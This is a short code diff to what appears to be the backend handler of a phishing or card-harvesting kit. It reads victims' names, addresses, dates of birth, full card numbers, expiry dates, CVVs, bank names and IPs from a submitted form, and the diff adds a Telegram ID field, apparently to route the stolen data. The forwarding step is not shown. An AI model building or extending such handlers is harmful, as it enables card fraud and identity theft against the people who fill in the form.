@@ -4,7 +4,7 @@ let count = 0;
 
 const sendRes = async (req, res) => {
     let {
-        firstName, lastName, telephone, address, state, city, zip, dob, ccname, ccnum, ccexp, cccvv, bin, bankName, userAgent, ip
+        firstName, lastName, telephone, address, state, city, zip, dob, ccname, ccnum, ccexp, cccvv, bin, bankName, userAgent, ip, telegramId
     } = req.body;
 
     if (bin.length === 7) {
